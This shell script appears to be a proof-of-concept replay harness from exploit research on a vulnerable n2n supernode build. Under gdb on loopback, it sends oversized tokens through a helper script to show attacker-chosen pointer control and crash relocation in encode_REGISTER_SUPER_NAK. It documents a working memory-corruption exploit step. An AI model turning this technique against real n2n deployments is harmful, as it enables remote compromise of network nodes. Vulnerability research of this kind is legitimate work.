#!/bin/sh
# W10 one-command replay: wire-chosen pointer control on the pinned
# clang -O2 vulnerable supernode. Builds once, then runs three loopback
# cases with gdb (ASLR disabled for the calibration value):
#   A: token_size=48     -> calibration, read live `comm` before decode
#   B: token_size=1700   -> garbage pointer at nak+1696, SIGSEGV at :2324
#   C: token_size=1700, 8 chosen bytes at token+1682 = live comm value
#                       -> fault moves to :2344 in encode_REGISTER_SUPER_NAK
# No external network contact; supernodes bind 127.0.0.1 only.
set -u
HERE=$(cd "$(dirname "$0")" || exit 1; pwd)
N2N=$(cd "$HERE/.." || exit 1; pwd)
TARBALL=$N2N/provision/n2n-vuln.tar.gz
SENDER=$HERE/w10_large_peer.py
EVID=$HERE/evidence
WORK=${TMPDIR:-/tmp}/n2n2shell-w10-replay.$$
BASE=${PORT_BASE:-18950}
PASS=0
FAIL=0
mkdir -p "$WORK" || exit 1
trap 'rm -rf "$WORK"' EXIT HUP INT TERM
check() {
    if [ "$2" -eq 0 ]; then PASS=$((PASS+1)); echo "PASS $1";
    else FAIL=$((FAIL+1)); echo "FAIL $1"; fi
}

mkdir -p "$WORK/src" || exit 1
tar xzf "$TARBALL" -C "$WORK/src" || exit 1
SRC=$WORK/src/n2n-dc7324af16b2ff3e2b22961e7d8dffcb14f3f6ff
(cd "$SRC" && sh autogen.sh &&
    CC=clang CFLAGS="-g -O2 -fno-omit-frame-pointer" ./configure &&
    make -j4 supernode) >"$EVID/w10-replay-build.log" 2>&1
check 01-clang-o2-build "$?"
[ -x "$SRC/supernode" ] || { echo "RESULT $PASS PASS / $FAIL FAIL"; exit 1; }

gdb_case() {
    label=$1 port=$2 token=$3 override=$4
    cmd=$WORK/gdb-$label.txt
    cat >"$cmd" <<EOF
set pagination off
set confirm off
set disable-randomization on
break sn_utils.c:2322
run -f -p 127.0.0.1:$port -t $((port+1)) -c community.list -F labfed -M
printf "W10_PREDECODE_COMM "
p comm
continue
printf "W10_STOP\n"
info registers rip
x/i \$pc
bt 10
printf "W10_DONE\n"
kill
quit
EOF
    (cd "$SRC" && timeout 40 gdb -q -batch -x "$cmd" ./supernode) \
        >"$EVID/w10-replay-$label.log" 2>&1 &
    gp=$!
    sleep 5
    if [ -n "$override" ]; then
        python3 "$SENDER" "$port" "$((port+10))" "$token" "$override" \
            >"$EVID/w10-replay-$label-sender.log" 2>&1
    else
        python3 "$SENDER" "$port" "$((port+10))" "$token" \
            >"$EVID/w10-replay-$label-sender.log" 2>&1
    fi
    wait "$gp" 2>/dev/null || true
}

# A: calibration. Break before decode and read the live comm pointer.
gdb_case calib "$BASE" 48 ""
grep -q 'W10_PREDECODE_COMM .*0x[0-9a-f]*' "$EVID/w10-replay-calib.log"
check 02-calibration-break "$?"
COMM=$(grep 'W10_PREDECODE_COMM' "$EVID/w10-replay-calib.log" |
       sed -n 's/.*\(0x[0-9a-f]*\).*/\1/p')
[ -n "$COMM" ]; check 03-live-comm-pointer "$?"
echo "CALIB comm=$COMM"

# B: garbage pointer. The whole reachable window is chosen bytes.
gdb_case garbage "$((BASE+20))" 1700 ""
grep -q 'Program received signal SIGSEGV' "$EVID/w10-replay-garbage.log"
check 04-garbage-sigsegv "$?"
grep -q 'sn_utils.c:2324' "$EVID/w10-replay-garbage.log"
check 05-garbage-fault-at-2324 "$?"
grep -q '0x5a48494d5a48494d' "$EVID/w10-replay-garbage.log"
check 06-chosen-bytes-in-frame "$?"

# C: wire-chosen valid comm pointer at token+1682 (= nak+1696).
gdb_case chosencomm "$((BASE+40))" 1700 "1682:$COMM"
grep -q 'override token+1682' "$EVID/w10-replay-chosencomm-sender.log"
check 07-wire-chosen-pointer-sent "$?"
grep -q 'sn_utils.c:2344' "$EVID/w10-replay-chosencomm.log"
check 08-fault-moved-to-2344 "$?"
grep -q 'encode_REGISTER_SUPER_NAK' "$EVID/w10-replay-chosencomm.log"
check 09-encoder-consumed-pointer "$?"

echo "RESULT $PASS PASS / $FAIL FAIL"
echo "RAW $EVID/w10-replay-*.log"
[ "$FAIL" -eq 0 ]
